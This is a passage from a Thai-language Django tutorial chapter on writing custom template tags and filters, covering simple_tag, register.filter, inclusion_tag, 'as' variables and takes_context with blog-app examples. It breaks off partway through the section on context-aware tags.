# Part 029: Custom Template Tags และ Filters

> **ขั้นตอนที่ 281-290 ของหลักสูตร** | Phase 3: Views, Templates, Forms และ CBV
>
> เป้าหมายของ Part นี้: เรียนรู้การสร้าง **Custom Template Tag และ Custom Filter**
> ของตัวเองอย่างครบวงจร ตั้งแต่การตั้งค่าโฟลเดอร์ `templatetags/`, การเขียน
> `simple_tag` และ `@register.filter` ที่รับ argument, `inclusion_tag` ที่ render
> sub-template ของตัวเอง, วิธีใช้ `as` variable แทน `assignment_tag` ที่ถูกถอดออก
> ไปแล้ว, การเข้าถึง context ทั้งหมดด้วย `takes_context=True`, ไปจนถึงการเขียน
> custom `Node` class แบบมี opening/closing tag ขั้นสูง, ข้อควรระวังด้านความ
> ปลอดภัยเรื่อง XSS และ `mark_safe`, และวิธีเขียนเทสต์ให้ tag/filter ที่คุณสร้างเอง
> เมื่อจบ Part นี้ แอป `blog` ของคุณจะมีไฟล์ `blog/templatetags/blog_extras.py`
> ที่บรรจุ tag และ filter ใช้งานจริงหลายตัว พร้อมชุดเทสต์ที่ครอบคลุมทุกตัว

---

## สารบัญของ Part นี้

- ขั้นตอนที่ 281: ตั้งค่าโฟลเดอร์ `templatetags/` ในแอป — `__init__.py`, `register`, การ `{% load %}`
- ขั้นตอนที่ 282: เขียน `simple_tag` ที่รับ argument (`{% reading_time post.content %}`)
- ขั้นตอนที่ 283: เขียน Custom Filter ด้วย `@register.filter` ที่รับ argument เพิ่ม (`{{ value|truncate_smart:50 }}`)
- ขั้นตอนที่ 284: เขียน `inclusion_tag` ที่ render sub-template ของตัวเอง (`{% render_post_card post %}`)
- ขั้นตอนที่ 285: ทางเลือกแทน `assignment_tag` ที่ถูกถอดออกแล้ว — ใช้ `simple_tag` ร่วมกับ `as` variable
- ขั้นตอนที่ 286: เขียน tag ที่ต้องเข้าถึง context ทั้งหมดด้วย `takes_context=True`
- ขั้นตอนที่ 287: ขั้นสูง — เขียน custom `Node` class และ compile function สำหรับ tag แบบมี opening/closing
- ขั้นตอนที่ 288: ข้อควรระวังด้านความปลอดภัย — Escaping, ความเสี่ยงของ `mark_safe`, XSS
- ขั้นตอนที่ 289: การเขียนเทสต์สำหรับ Custom Template Tag/Filter
- ขั้นตอนที่ 290: สรุปและแบบฝึกหัด

---

## ขั้นตอนที่ 281: ตั้งค่าโฟลเดอร์ `templatetags/` ในแอป

### 281.1 ทบทวนสัญญาที่ค้างไว้จาก Part 008

ใน Part 008 ขั้นตอนที่ 74.5 คุณเห็นตัวอย่าง custom filter `reading_time` แบบคร่าว ๆ
พร้อมคำสัญญาว่าจะกลับมาเจาะลึกเรื่อง **Custom Template Tags และ Filters** แบบเต็ม
รูปแบบใน Part นี้ ถึงเวลานั้นแล้ว — เราจะสร้างไฟล์ `templatetags/` ให้ถูกต้องตาม
โครงสร้างที่ Django กำหนด แล้วสร้าง tag/filter ใช้งานจริงทีละตัวจนครบ

ก่อนจะเริ่ม ให้ทบทวน model `Post` ของแอป `blog` จาก Part 007-008 ที่เราจะใช้เป็น
ตัวอย่างตลอด Part นี้:

```python
# blog/models.py (ทบทวนจาก Part 007-008)
from django.db import models
from django.urls import reverse


class Post(models.Model):
    title = models.CharField(max_length=200)
    slug = models.SlugField(max_length=220, unique=True)
    content = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    is_published = models.BooleanField(default=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        return self.title

    def get_absolute_url(self):
        return reverse('blog:detail', kwargs={'slug': self.slug})
```

### 281.2 ทำไม Django ถึงต้องมีระบบ `templatetags/` แยกต่างหาก

Django Template Language (DTL) จงใจจำกัดความสามารถของตัวเอง (ทบทวนจาก Part 008
ขั้นตอนที่ 71.7 — "Template ไม่ควรมี business logic") ซึ่งหมายความว่าบาง feature ที่
โปรเจกต์จริงต้องการ (เช่น คำนวณเวลาอ่านบทความ, format ข้อความแบบพิเศษ, render
component ซ้ำ ๆ) ไม่มีมาให้ในตัว DTL

Django แก้ปัญหานี้ด้วยการเปิดช่องให้นักพัฒนา **ขยาย (extend) DTL ด้วย Python code
ของตัวเอง** ผ่านระบบที่เรียกว่า **Custom Template Tags and Filters** โดยมีกฎ
ตายตัวว่า โค้ดเหล่านี้ต้องอยู่ในโฟลเดอร์ชื่อ `templatetags/` ภายในแอป Django จึงจะ
ค้นพบและโหลดมันได้อัตโนมัติ

### 281.3 โครงสร้างโฟลเดอร์ที่ Django กำหนด

```
blog/
├── __init__.py
├── models.py
├── views.py
├── urls.py
├── templates/
│   └── blog/
│       ├── list.html
│       └── detail.html
└── templatetags/              ← โฟลเดอร์ใหม่ที่ต้องสร้าง
    ├── __init__.py            ← บังคับต้องมี ทำให้เป็น Python package
    └── blog_extras.py         ← ไฟล์ที่เก็บ tag/filter ของแอปนี้
```

สร้างโฟลเดอร์และไฟล์:

```bash
mkdir blog/templatetags
touch blog/templatetags/__init__.py
touch blog/templatetags/blog_extras.py
```

> **ข้อควรระวังที่มือใหม่พลาดบ่อยที่สุด**: ลืมสร้าง `__init__.py` ในโฟลเดอร์
> `templatetags/` ถ้าไม่มีไฟล์นี้ Python จะไม่มองว่า `templatetags/` เป็น package
> และ Django จะหา module `blog_extras` ไม่เจอเลย แม้ไฟล์ `blog_extras.py` จะอยู่
> ถูกที่ก็ตาม — อาการที่พบคือ `{% load blog_extras %}` จะ error ว่า
> `'blog_extras' is not a registered tag library`

### 281.4 `register = template.Library()`: จุดเริ่มต้นของทุกไฟล์ templatetags

ทุกไฟล์ในโฟลเดอร์ `templatetags/` ที่จะประกาศ tag หรือ filter **ต้อง** มีตัวแปรชื่อ
`register` ที่เป็น instance ของ `template.Library` เสมอ — นี่คือ "จุดลงทะเบียน" ที่
Django ใช้ค้นหาว่าไฟล์นี้มี tag/filter อะไรบ้าง

```python
# blog/templatetags/blog_extras.py
from django import template

register = template.Library()

# tag และ filter ทั้งหมดที่เราจะสร้างใน Part นี้ จะถูก decorate ด้วย @register.xxx
# แล้วเพิ่มเข้ามาในไฟล์นี้ทีละตัวตลอดทั้ง Part
```

`template.Library` มี decorator หลักอยู่ 3 ตัวที่เราจะใช้ตลอด Part นี้:

| Decorator | ใช้เมื่อ | ตัวอย่างการเรียกใช้ใน template |
|---|---|---|
| `@register.filter` | แปลงค่าตัวแปรเดียว (0-1 argument) | `{{ value\|my_filter }}` หรือ `{{ value\|my_filter:arg }}` |
| `@register.simple_tag` | คำนวณค่าจาก argument กี่ตัวก็ได้ คืนเป็นข้อความ | `{% my_tag arg1 arg2 %}` |
| `@register.inclusion_tag` | render sub-template ของตัวเอง ด้วย context ที่กำหนด | `{% my_tag arg1 %}` |

### 281.5 `{% load %}`: การนำ Library เข้ามาใช้ในเทมเพลต

ทบทวนจาก Part 008 ขั้นตอนที่ 77.1 (เรื่อง `{% load static %}`): Django **ไม่โหลด
tag library ทุกตัวเข้าทุกเทมเพลตอัตโนมัติ** ด้วยเหตุผลด้าน performance และความ
ชัดเจนของโค้ด (อ่านเทมเพลตแล้วรู้ทันทีว่ามันพึ่งพา library ไหนบ้าง) ดังนั้นก่อนใช้
tag/filter ที่เราสร้างเอง ต้องสั่ง `{% load %}` ก่อนเสมอ โดยชื่อที่ใช้ load คือ
**ชื่อไฟล์ .py** (ไม่ใช่ชื่อแอป):

```html
{% load blog_extras %}

<p>{{ post.content|truncate_smart:100 }}</p>
```

กฎการวาง `{% load %}` ที่ควรรู้:

- วางไว้บนสุดของไฟล์ (หรือทันทีหลัง `{% extends %}` ถ้ามี — เหมือนกฎของ
  `{% load static %}`)
- `{% load %}` มีผลเฉพาะไฟล์เทมเพลตนั้น ๆ เท่านั้น **ไม่สืบทอด** ไปยังไฟล์ที่
  `{% extends %}` หรือ `{% include %}` เข้ามา — ถ้า `list.html` extends จาก
  `base.html` และ `base.html` ต้องใช้ tag ของ `blog_extras` ด้วย ก็ต้อง
  `{% load blog_extras %}` ใน `base.html` เองแยกต่างหาก
- `{% load %}` หลาย library พร้อมกันในบรรทัดเดียวได้: `{% load static blog_extras %}`

### 281.6 Django ค้นหา Tag Library จากที่ไหนบ้าง

Django สแกนหา `templatetags/` ในทุกแอปที่อยู่ใน `INSTALLED_APPS` โดยอัตโนมัติ
(หลักการเดียวกับ `APP_DIRS` ของ template ใน Part 008 ขั้นตอนที่ 71.4) นั่นหมายความ
ว่าตราบใดที่ `'blog'` อยู่ใน `INSTALLED_APPS` (ซึ่งตั้งไว้ตั้งแต่ Part 005) ไฟล์
`blog/templatetags/blog_extras.py` จะถูกค้นพบทันทีโดยไม่ต้องตั้งค่าเพิ่มเติมใด ๆ

```python
# config/settings.py (ทบทวน — ไม่ต้องแก้อะไรเพิ่ม)
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'blog',
]
```

> **ข้อควรรู้**: ถ้าสองแอปมีไฟล์ `templatetags/` ที่ตั้งชื่อไฟล์ซ้ำกัน (เช่น
> `blog/templatetags/extras.py` กับ `shop/templatetags/extras.py`) Django จะสับสน
> ว่าจะ `{% load extras %}` จากไฟล์ไหน (ใช้ไฟล์แรกที่เจอตามลำดับ `INSTALLED_APPS`)
> จึงควรตั้งชื่อไฟล์ templatetags ให้มี prefix ของแอปเสมอ เช่น `blog_extras.py`
> แทนที่จะใช้ชื่อกลาง ๆ อย่าง `extras.py` — เป็นหลักการเดียวกับ App Namespacing
> ของ templates และ static files ที่เรียนมาแล้วใน Part 008

---

## ขั้นตอนที่ 282: เขียน `simple_tag` ที่รับ Argument

### 282.1 `simple_tag` คืออะไร

**`simple_tag`** คือวิธีที่ง่ายและยืดหยุ่นที่สุดในการสร้าง custom tag เหมาะกับงาน
ที่ต้อง **รับ argument หลายตัว คำนวณบางอย่าง แล้วคืนค่าเป็นข้อความ** ต่างจาก filter
ตรงที่ `simple_tag` รับ argument ได้ไม่จำกัดจำนวน (filter รับได้สูงสุดแค่ 1
argument)

### 282.2 เขียน `reading_time`: คำนวณเวลาอ่านบทความโดยประมาณ

เติมโค้ดต่อจาก `blog/templatetags/blog_extras.py`:

```python
# blog/templatetags/blog_extras.py
from django import template

register = template.Library()


@register.simple_tag
def reading_time(content, words_per_minute=200):
    """คำนวณเวลาอ่านโดยประมาณจากจำนวนคำในเนื้อหา

    สมมติฐาน: คนไทยอ่านเนื้อหาเว็บโดยเฉลี่ยประมาณ 200 คำ/นาที
    (ตัวเลขนี้ปรับได้ตาม argument ตัวที่สอง)
    """
    word_count = len(content.split())
    minutes = max(1, round(word_count / words_per_minute))
    return f"{minutes} นาที"
```

ใช้งานในเทมเพลต:

```html
{% load blog_extras %}

<article>
    <h1>{{ post.title }}</h1>
    <p class="post-meta">
        ใช้เวลาอ่านประมาณ {% reading_time post.content %}
    </p>
    {{ post.content|linebreaks }}
</article>
```

หรือระบุความเร็วในการอ่านเอง (argument ตัวที่สอง):

```html
{% reading_time post.content 250 %}
```

### 282.3 ทำไม `simple_tag` ถึง "ง่าย" กว่า Custom `Node`

เบื้องหลัง `simple_tag` คือ decorator ที่ Django สร้าง `Node` และ compile function
ให้อัตโนมัติ (เราจะเห็นวิธีเขียนเองแบบ manual ในขั้นตอนที่ 287) สิ่งที่คุณต้องทำมี
แค่ 2 อย่าง:

1. เขียนฟังก์ชัน Python ธรรมดา รับ argument ตามที่ต้องการ คืนค่าเป็น string
   (หรือค่าอะไรก็ได้ที่แปลงเป็น string ได้)
2. ครอบด้วย `@register.simple_tag`

Django จะจัดการเรื่องเหล่านี้ให้อัตโนมัติทั้งหมด:

| สิ่งที่ Django จัดการให้อัตโนมัติ | อธิบาย |
|---|---|
| Parse argument จาก template syntax | แปลง `post.content` ที่เขียนใน `{% %}` เป็นค่าจริงก่อนส่งเข้าฟังก์ชัน |
| รองรับ positional และ keyword argument | `{% reading_time post.content words_per_minute=250 %}` ใช้ได้ |
| Auto-escape ผลลัพธ์ | ค่าที่ฟังก์ชันคืนมาจะถูก escape ก่อนแสดงผล (ปลอดภัยจาก XSS โดยอัตโนมัติ — รายละเอียดเต็มในขั้นตอนที่ 288) |
| รองรับ `as` variable | `{% reading_time post.content as rt %}` ใช้ได้ทันทีโดยไม่ต้องเขียนอะไรเพิ่ม (ขั้นตอนที่ 285) |

### 282.4 ตั้งชื่อ Tag ต่างจากชื่อฟังก์ชัน Python ด้วย `name`

ถ้าต้องการให้ชื่อ tag ในเทมเพลตต่างจากชื่อฟังก์ชัน Python (เช่น หลีกเลี่ยงชื่อ
ที่ชนกับ built-in tag หรือ Python keyword) ใช้ argument `name`:

```python
@register.simple_tag(name="est_reading_time")
def calculate_reading_time(content, words_per_minute=200):
    word_count = len(content.split())
    minutes = max(1, round(word_count / words_per_minute))
    return f"{minutes} นาที"
```

```html
{% est_reading_time post.content %}
```

### 282.5 อีกตัวอย่าง: `simple_tag` ที่รับหลาย Argument จริง ๆ

ตัวอย่างที่ใกล้เคียงงานจริงมากขึ้น — tag ที่สร้างลิงก์แบ่งหน้า (pagination link)
โดยรับหลาย argument พร้อมกัน:

```python
@register.simple_tag
def query_transform(request, **kwargs):
    """สร้าง query string ใหม่จาก GET params เดิม โดย override บาง key
    มีประโยชน์มากตอนทำ pagination ร่วมกับ filter/search (จะใช้จริงใน Part 044)
    """
    updated = request.GET.copy()
    for key, value in kwargs.items():
        updated[key] = value
    return updated.urlencode()
```

```html
<a href="?{% query_transform request page=2 %}">หน้าถัดไป</a>
```

สังเกตว่า `simple_tag` รองรับทั้ง positional argument (`request`) และ
**keyword argument ที่ไม่ทราบจำนวนล่วงหน้า** (`**kwargs`) ได้เลย — ยืดหยุ่นกว่า
filter มาก

---

## ขั้นตอนที่ 283: เขียน Custom Filter ด้วย `@register.filter`

### 283.1 กฎของ Custom Filter: รับได้สูงสุด 1 Argument

ต่างจาก `simple_tag` ที่รับ argument กี่ตัวก็ได้ **filter ทุกตัวรับได้สูงสุดแค่
2 พารามิเตอร์เท่านั้น**: ค่าตั้งต้น (บังคับ) และ argument (ทางเลือก)

```python
def my_filter(value, arg=None):
    ...
```

นี่คือข้อจำกัดโดยการออกแบบของ DTL syntax เอง (`{{ value|filter:arg }}` มีที่ให้ใส่
argument แค่จุดเดียวหลังเครื่องหมาย `:`) ถ้างานของคุณต้องการมากกว่า 1 argument
ต้องใช้ `simple_tag` แทน

### 283.2 เขียน `truncate_smart`: ตัดข้อความโดยไม่ตัดกลางคำ

`truncatewords` และ `truncatechars` ที่มีมาให้ (Part 008 ขั้นตอนที่ 74.2) มีข้อจำกัด
คนละแบบ: `truncatewords` นับเป็น "คำ" (ใช้ไม่ได้ดีกับภาษาไทยที่ไม่มีช่องว่างคั่นคำ)
ส่วน `truncatechars` นับ**ตัวอักษร**เป๊ะ ๆ ซึ่งอาจตัดกลางคำภาษาอังกฤษพอดี เช่น
`"Django Template Lan…"` — เราจะเขียน filter ที่ฉลาดขึ้น: ตัดตามจำนวนตัวอักษรที่
กำหนด แต่ถอยกลับไปยัง**ขอบเขตช่องว่างที่ใกล้ที่สุด** ก่อนตัด เพื่อไม่ให้คำขาดกลาง:

```python
# blog/templatetags/blog_extras.py (เพิ่มต่อจากเดิม)
from django import template
from django.utils.safestring import mark_safe
from django.utils.html import escape

register = template.Library()


@register.simple_tag
def reading_time(content, words_per_minute=200):
    word_count = len(content.split())
    minutes = max(1, round(word_count / words_per_minute))
    return f"{minutes} นาที"


@register.filter(name="truncate_smart")
def truncate_smart(value, limit=100):
    """ตัดข้อความให้ยาวไม่เกิน limit ตัวอักษร โดยไม่ตัดกลางคำ (ถ้าเป็นไปได้)

    ถ้าข้อความสั้นกว่าหรือเท่ากับ limit อยู่แล้ว คืนค่าเดิมโดยไม่แตะต้อง
    ถ้ายาวเกิน จะพยายามตัดที่ช่องว่างล่าสุดก่อนตำแหน่ง limit แล้วเติม "…"
    """
    value = str(value)
    limit = int(limit)

    if len(value) <= limit:
        return value

    truncated = value[:limit]
    last_space = truncated.rfind(" ")

    # ถ้าเจอช่องว่างและไม่ใกล้จุดเริ่มต้นเกินไป ให้ตัดที่ช่องว่างนั้น
    if last_space > limit * 0.6:
        truncated = truncated[:last_space]

    return truncated.rstrip() + "…"
```

ใช้งานในเทมเพลต:

```html
{% load blog_extras %}

<p class="excerpt">{{ post.content|truncate_smart:80 }}</p>

<!-- ใช้ค่า default (100) โดยไม่ระบุ argument -->
<p class="excerpt">{{ post.content|truncate_smart }}</p>
```

### 283.3 Chain ต่อกับ Filter มาตรฐานอื่นได้ตามปกติ

Custom filter ทำงานร่วมกับระบบ chain ของ DTL (Part 008 ขั้นตอนที่ 74.1) ได้เหมือน
filter ที่มากับ Django เอง:

```html
{{ post.content|truncate_smart:150|linebreaksbr }}
```

### 283.4 ตารางเปรียบเทียบ `@register.filter` กับ `@register.simple_tag`

| ประเด็น | `@register.filter` | `@register.simple_tag` |
|---|---|---|
| ไวยากรณ์ในเทมเพลต | `{{ value\|name }}` หรือ `{{ value\|name:arg }}` | `{% name arg1 arg2 ... %}` |
| จำนวน argument สูงสุด | 1 (นอกจากค่าตั้งต้น) | ไม่จำกัด (positional + keyword) |
| เชื่อมต่อกับ filter อื่นแบบ chain (`\|`) | ✅ ได้ | ❌ ไม่ได้ |
| ใช้ใน `{% if %}` ได้ไหม | ✅ ได้ (`{% if value\|name %}`) | ❌ ไม่ได้ |
| เหมาะกับ | แปลงรูปแบบของค่าเดียว | คำนวณ/ประกอบข้อมูลจากหลายค่า |

### 283.5 `is_safe` และ `needs_autoescape`: ควบคุมพฤติกรรม Auto-Escaping ของ Filter

filter บางตัวรู้ตัวว่าผลลัพธ์ปลอดภัย (ไม่มี HTML แปลกปลอมหลุดเข้ามา) จึงบอก Django
ได้ว่า **ไม่ต้อง escape ซ้ำ** ด้วย `is_safe=True` — แต่ต้องระวังมาก เพราะถ้าใช้ผิด
จะเปิดช่องให้เกิด XSS ได้ (รายละเอียดเต็มในขั้นตอนที่ 288):

```python
@register.filter(is_safe=True)
def truncate_smart(value, limit=100):
    # is_safe=True บอก Django ว่า: "ถ้า input ปลอดภัยอยู่แล้ว (escape มาแล้ว
    # หรือเป็น SafeString) ผลลัพธ์จาก filter นี้ก็ยังปลอดภัยอยู่"
    # ที่ใช้ได้ปลอดภัยตรงนี้เพราะเราแค่ตัด string ไม่ได้เติม HTML tag ใด ๆ เข้าไป
    ...
```

`is_safe=True` **ไม่ได้แปลว่า** filter จะปิด auto-escape ให้เสมอ — มันแค่บอกว่า
"ถ้า input เดิมปลอดภัย ผลลัพธ์นี้ก็ปลอดภัยตามไปด้วย" Django ยังคง escape
ผลลัพธ์สุดท้ายตามค่า autoescape ของ input เดิมอยู่ดี ต่างจาก `mark_safe()` ที่
**บังคับ**ให้ปลอดภัยโดยไม่สนใจ input เลย (อันตรายกว่ามาก)

---

## ขั้นตอนที่ 284: เขียน `inclusion_tag` ที่ Render Sub-template ของตัวเอง

### 284.1 `inclusion_tag` คืออะไร และต่างจาก `{% include %}` อย่างไร

ทบทวนจาก Part 008 ขั้นตอนที่ 76: `{% include %}` ดึงไฟล์เทมเพลตอื่นมาแปะโดยส่ง
context ทั้งหมด (หรือเฉพาะที่ระบุด้วย `with`/`only`) เข้าไปตรง ๆ

**`inclusion_tag`** ทำสิ่งที่คล้ายกันแต่ต่างกันตรงจุดสำคัญ: มันคือ **ฟังก์ชัน
Python** ที่รับ argument, **ประมวลผลข้อมูลก่อน**, แล้วค่อยส่ง context ที่คำนวณ
เสร็จแล้วเข้าไป render sub-template ที่กำหนดไว้ตายตัว — เหมาะกับ "component" ที่
ต้องมี logic เบื้องหลังก่อนแสดงผล ไม่ใช่แค่ดึงไฟล์มาแปะเฉย ๆ

| | `{% include %}` | `inclusion_tag` |
|---|---|---|
| ระบุไฟล์ template ตอนไหน | ระบุตอนเรียกใช้ในเทมเพลต (`{% include 'x.html' %}`) | ผูกไว้ตายตัวตอนสร้าง tag (นักพัฒนากำหนดไว้ล่วงหน้า) |
| มี logic คำนวณก่อน render ได้ไหม | ไม่ได้ (ส่ง context ตรง ๆ) | ได้เต็มที่ (เขียน Python function ได้อิสระ) |
| Context ที่ template ลูกเห็น | context เดิมทั้งหมด (เว้นแต่ใช้ `only`) | เฉพาะสิ่งที่ฟังก์ชัน `return` ออกมาเท่านั้น |
| ต้อง `{% load %}` ก่อนไหม | ไม่ต้อง (built-in tag) | ต้อง (เป็น custom tag ในแอป) |

### 284.2 เขียน `render_post_card`

เรามี partial `_post_card.html` อยู่แล้วจาก Part 008 ขั้นตอนที่ 76.5 มาแปลงให้ใช้
ผ่าน `inclusion_tag` แทน `{% include %}` เพื่อให้ควบคุม logic การแสดงผลได้มากขึ้น
(เช่น ไฮไลต์การ์ดที่ตรงกับเงื่อนไขบางอย่าง):

```html
<!-- blog/templates/blog/_post_card.html -->
<article class="post-card {% if highlight %}post-card--highlight{% endif %}">
    <h2><a href="{{ post.get_absolute_url }}">{{ post.title }}</a></h2>
    <p class="post-card__meta">{{ post.created_at|date:"d F Y" }}</p>
    <p class="post-card__excerpt">{{ post.content|truncate_smart:120 }}</p>
    {% if show_reading_time %}
        <p class="post-card__reading-time">
            อ่านประมาณ {% reading_time post.content %}
        </p>
    {% endif %}
</article>
```

```python
# blog/templatetags/blog_extras.py (เพิ่มต่อจากเดิม)
@register.inclusion_tag('blog/_post_card.html')
def render_post_card(post, highlight=False, show_reading_time=True):
    """Render การ์ดแสดงบทความ 1 ใบ พร้อมควบคุมการไฮไลต์และการโชว์เวลาอ่าน

    คืนค่าเป็น dict ที่จะกลายเป็น context ของ _post_card.html โดยตรง
    — เห็น "เฉพาะ" คีย์ที่ระบุในนี้เท่านั้น ไม่เห็น context อื่นจากหน้าที่เรียก
    """
    return {
        'post': post,
        'highlight': highlight,
        'show_reading_time': show_reading_time,
    }
```

ใช้งานในเทมเพลตหลัก:

```html
<!-- blog/templates/blog/list.html -->
{% extends 'base.html' %}
{% load blog_extras %}

{% block content %}
<h1>บทความทั้งหมด</h1>

{% for post in posts %}
    {% render_post_card post highlight=post.is_published show_reading_time=True %}
{% empty %}
    <p>ยังไม่มีบทความในขณะนี้</p>
{% endfor %}
{% endblock %}
```

ผลลัพธ์คือ HTML เดียวกันในทุกจุดที่เรียก `{% render_post_card %}` เพราะ logic การ
ตัดสินใจ (เช่นค่า default ของ `show_reading_time`) ถูกเก็บไว้ที่**จุดเดียว**ในไฟล์
Python — ตรงตามหลัก DRY ที่ย้ำมาตลอดหลักสูตร

### 284.3 `takes_context=True` กับ `inclusion_tag`

`inclusion_tag` ก็รองรับ `takes_context=True` ได้เช่นเดียวกับ `simple_tag`
(รายละเอียดเต็มในขั้นตอนที่ 286) ซึ่งมีประโยชน์เมื่อ sub-template ต้องรู้ข้อมูลจาก
context เดิม เช่น `request.user`:

```python
@register.inclusion_tag('blog/_post_card.html', takes_context=True)
def render_post_card(context, post, highlight=False):
    request = context.get('request')
    is_owner = bool(
        request and request.user.is_authenticated
        and getattr(post, 'author_id', None) == request.user.id
    )
    return {
        'post': post,
        'highlight': highlight,
        'is_owner': is_owner,
        'request': request,   # ต้องส่งต่อเข้าไปเองถ้า sub-template ต้องใช้
    }
```

> **ข้อควรระวัง**: เมื่อใช้ `takes_context=True` กับ `inclusion_tag`, argument
> `context` จะกลายเป็น**พารามิเตอร์แรกเสมอ** (มาก่อน `post`) และที่สำคัญกว่านั้น
> คือ **`return` dict จะกลายเป็น context ใหม่ทั้งหมดของ sub-template** — มันไม่ได้
> รวมกับ context เดิมให้อัตโนมัติเหมือน `{% include %}` ถ้า sub-template ต้องใช้
> ตัวแปรอะไรจาก context เดิม (เช่น `request` สำหรับ `{% url %}` บางแบบ) ต้องใส่
> เข้าไปใน dict ที่ return เองอย่างชัดเจนเสมอ

### 284.4 กำหนด Template แบบ Dynamic ด้วย `takes_context` ร่วมกับ Path เงื่อนไข

บางกรณีอยากใช้ sub-template คนละไฟล์ตามเงื่อนไข (เช่น การ์ดแบบย่อกับแบบเต็ม)
วิธีที่สะอาดที่สุดคือแยกเป็น 2 tag คนละชื่อ ไม่ใช่พยายามสลับไฟล์ภายใน tag เดียว
เพราะ `inclusion_tag` ผูกไฟล์ไว้ตายตัวตอน decorate:

```python
@register.inclusion_tag('blog/_post_card.html')
def render_post_card(post, highlight=False):
    return {'post': post, 'highlight': highlight}


@register.inclusion_tag('blog/_post_card_compact.html')
def render_post_card_compact(post):
    return {'post': post}
```

---

## ขั้นตอนที่ 285: ทางเลือกแทน `assignment_tag` ด้วย `simple_tag` + `as`

### 285.1 ประวัติ: `assignment_tag` คืออะไร และทำไมถึงถูกถอดออก

ในเวอร์ชันเก่าของ Django (ก่อน 1.9) มี decorator แยกต่างหากชื่อ
`@register.assignment_tag` สำหรับสร้าง tag ที่ **ไม่ print ค่าออกมาทันที แต่เก็บ
ผลลัพธ์ไว้ในตัวแปรผ่าน `as`** เช่น:

```html
<!-- syntax เก่าที่ใช้ไม่ได้แล้ว (Django < 1.9) -->
{% get_top_posts 5 as top_posts %}
```

`assignment_tag` ถูก **deprecate ใน Django 1.9 และถูกถอดออกอย่างสมบูรณ์ใน Django
2.0** เพราะทีม Django ค้นพบว่าความสามารถของมันซ้ำซ้อนกับ `simple_tag` เกือบ 100%
— สิ่งเดียวที่ `assignment_tag` ทำได้แต่ `simple_tag` เดิมทำไม่ได้ (ตอนนั้น) คือ
การรองรับ `as variable` ทีมงานจึงแก้ปัญหาด้วยการ **เพิ่มความสามารถ `as` เข้าไปใน
`simple_tag` โดยตรง** แล้วถอด `assignment_tag` ทิ้งไปเลย เพื่อลด API ที่ซ้ำซ้อน

### 285.2 `simple_tag` รองรับ `as` มาให้แล้วโดยอัตโนมัติ — ไม่ต้องเขียนอะไรเพิ่ม

ข่าวดีคือ: ทุก `simple_tag` ที่คุณเขียนมาตั้งแต่ขั้นตอนที่ 282 **รองรับ `as` อยู่
แล้วโดยไม่ต้องแก้โค้ดฟังก์ชัน Python แม้แต่บรรทัดเดียว** เพราะระบบ `as` ถูกจัดการ
โดย parser ของ `simple_tag` เอง ไม่เกี่ยวกับตัวฟังก์ชันเลย:

```html
{% load blog_extras %}

<!-- แบบปกติ: print ผลลัพธ์ทันที -->
<p>ใช้เวลาอ่านประมาณ {% reading_time post.content %}</p>

<!-- แบบเก็บใส่ตัวแปรด้วย as: ไม่ print ทันที เก็บไว้ใช้ต่อ -->
{% reading_time post.content as rt %}
<p>ใช้เวลาอ่านประมาณ {{ rt }}</p>
<meta name="reading-time" content="{{ rt }}">
```

### 285.3 ทำไมการเก็บด้วย `as` ถึงมีประโยชน์

การเก็บค่าไว้ในตัวแปรก่อนแทนที่จะ print ทันที มีข้อดีสำคัญ 2 ข้อ:

1. **ใช้ค่านั้นซ้ำได้หลายจุด** โดยไม่ต้องคำนวณ tag เดิมซ้ำหลายรอบ — ในตัวอย่างข้าง
   บน ถ้าไม่ใช้ `as` แล้วต้องการแสดง `reading_time` ทั้งใน `<p>` และ `<meta>`
   จะต้องเรียก `{% reading_time post.content %}` ซ้ำ 2 ครั้ง (คำนวณซ้ำ 2 รอบ
   โดยไม่จำเป็น)
2. **นำไปใช้ต่อใน `{% if %}` ได้** ซึ่ง tag แบบ print ตรง ๆ ทำไม่ได้เลย:

```html
{% get_related_posts post 3 as related %}
{% if related %}
    <section class="related-posts">
        <h3>บทความที่เกี่ยวข้อง</h3>
        {% for related_post in related %}
            {% render_post_card related_post %}
        {% endfor %}
    </section>
{% endif %}
```

ตัวอย่าง `get_related_posts` ที่คืนค่าเป็น QuerySet (ไม่ใช่ string) เพื่อใช้กับ
`{% for %}` และ `{% if %}` ต่อได้:

```python
@register.simple_tag
def get_related_posts(post, count=3):
    """คืนบทความอื่นที่เผยแพร่แล้ว ไม่รวมบทความปัจจุบัน จำนวนตามที่ระบุ

    simple_tag ไม่จำเป็นต้องคืนค่าเป็น string เสมอไป — คืนอะไรก็ได้
    ที่ template นำไปใช้ต่อได้ (QuerySet, list, dict, ...)
    เพียงแต่ถ้าไม่ใช้ `as` แล้ว print ตรง ๆ ผลลัพธ์จะถูกแปลงเป็น str()
    """
    return (
        Post.objects.filter(is_published=True)
        .exclude(pk=post.pk)
        .order_by('-created_at')[:count]
    )
```

อย่าลืม import `Post` ที่หัวไฟล์:

```python
# blog/templatetags/blog_extras.py (เพิ่มบรรทัด import ด้านบนสุด)
from blog.models import Post
```

### 285.4 ตารางสรุป: เมื่อไหร่ควรใช้ `as`

| สถานการณ์ | ควรใช้ `as` ไหม |
|---|---|
| ต้องการแสดงผลค่าครั้งเดียว จุดเดียว | ไม่จำเป็น — เรียก tag ตรง ๆ ก็พอ |
| ต้องการใช้ค่าเดียวกันหลายจุดในหน้าเดียว | ✅ ใช้ `as` เพื่อไม่ให้คำนวณซ้ำ |
| ต้องการนำผลลัพธ์ไปใช้ใน `{% if %}` / `{% for %}` ต่อ | ✅ ต้องใช้ `as` เท่านั้น (print ตรงใช้ต่อไม่ได้) |
| ค่าที่คืนไม่ใช่ string (QuerySet, dict, list, object) | ✅ เกือบเสมอ ควรใช้ `as` |

---

## ขั้นตอนที่ 286: เขียน Tag ที่เข้าถึง Context ทั้งหมดด้วย `takes_context=True`

### 286.1 ทำไมบาง Tag ถึงต้องเห็น Context ทั้งหมด

ปกติ `simple_tag` เห็นแค่ argument ที่ระบุตอนเรียกใช้เท่านั้น แต่บางสถานการณ์ tag
ต้องรู้ **ข้อมูลแวดล้อม** ที่ไม่ได้ถูกส่งเป็น argument ตรง ๆ เช่น `request` ปัจจุบัน,
`request.path` (เพื่อเช็คว่าอยู่หน้าไหน), หรือค่าตัวแปรอื่นที่มีอยู่ใน context ของ
